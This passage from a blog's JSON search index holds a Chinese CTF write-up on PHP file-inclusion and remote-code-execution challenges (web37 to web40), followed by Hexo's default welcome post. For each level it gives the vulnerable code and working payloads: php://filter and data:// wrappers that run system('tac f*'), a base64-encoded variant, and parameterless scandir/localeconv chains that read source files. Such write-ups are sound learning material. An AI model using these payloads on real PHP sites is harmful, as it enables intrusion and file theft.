\n}\n\npayload;\n?c=include%0a$_GET[cmd]?>&cmd=php://filter/read=convert.base64-encode/resource=flag.php\n?c=include$_GET[cmd]?>&cmd=data://text/plan,<?php system(\"tac flag.php\")?>\n\n\n```\n\n这次是多加了0-9的传参也就是说c传参里面原来的GET[cmd]本来是任意取值的现在的参数里面不能有数字\n\n#### web37\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n?c=php://filter/read=convert.base64-encode/resource=flag.php #这里过滤了flag不要使用这一条没用 我只是都想测一遍用下面两个\n?c=data://text/palin,<?php system(\"tac f*\");?>\n?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==\n\n```\n\n#### web38\n\n```php\n//flag in flag.php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|php|file/i\", $c)){\n        include($c);\n        echo $flag;\n    }\n\n}else{\n    highlight_file(__FILE__);\n}\ndata:// 是 PHP 支持的一个数据流包装协议，允许你使用数据（在这里是 PHP 代码）作为文件。\ntext/palin 是 data:// 协议的子类型，指定了数据的类型为纯文本。\n<?=system(\"tac f*\");?> 是 PHP 代码，使用 system 函数执行 tac f* 命令。\n    \n    payload:\n?c=data://text/palin,<?php system(\"tac f*\");?> #（使用不了用第二个我只是进行对比）这里php被过滤了使用不了可以改为短标签\n?c=data://text/palin,<?=system(\"tac f*\");?>\n?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==\n\n```\n\n#### web39\n\n```php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c.\".php\");\n    }//使用 preg_match 函数和正则表达式 /flag/i 检查 $c 中是否包含 flag（不区分大小写）。如果不包含，将 $c 后面添加 .php 后缀并使用 include 函数包含该文件。\n\n        \n}else{\n    highlight_file(__FILE__);\n}\npayload:\n?c=data://text/palin,<?=system(\"tac f*\");?>\n?c=data://text/palin,<?php system(\"tac f*\");?>\n\n```\n\n这个地方 include($c.\".php\");我有很大的疑问,就是豆包给的解释是`include($c.\".php\");`：将拼接后的字符串作为文件路径，尝试包含这个文件。如果文件存在，PHP 会将该文件的内容包含到当前文件中并执行；如果文件不存在，根据 PHP 的配置不同，可能会产生一个警告或错误（不过在这段代码中，由于 `error_reporting(0);` 的设置，错误不会显示）。\n\n但是这样解释是得不到flag的,于是我把sun师傅喊起来问他sun师傅解释一番但是我感觉不是很理解\n\n最后的结论是:\tc是data://text/palin,<?php system(\"tac f*\");?>后面衔接.php  但是这样理解是不对的   我的理解是在赋值的时候就已经进行命令执行了后面的.php实际上没有用到\t\n\n\n\n\n\n#### web40\n\n```php\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\<|\\.|\\>|\\/|\\?|\\\\\\\\/i\", $c)){\n        eval($c);\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\npayload\n?c=print_r(show_source(array_rand(array_flip(scandir(pos(localeconv()))))));\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\nnext()： 函数将内部指针指向数组中的下一个元素，并输出。\n?c=print_r(scandir(current(localeconv())));\nscandir(current(localeconv())) 查看当前目录所有文件名\n?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));\n\n```\n\n无参文件读取不是无回显\n\n过滤了很多字符 有大写得括号 这里得考点是：无参数文件读取 无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a('b')或a('b','c')，不能带参数 localeconv() 函数返回一包含本地数字及货币格式信息的数组。\ncurrent() 函数返回数组中的当前元素（单元）,默认取第一个值，\npos() 同 current() ,是current()的别名\nreset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE\narray_reverse()：数组逆序\narray_flip()是交换数组的键和值\n","tags":["RCE"]},{"title":"Hello World","url":"/2025/01/16/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]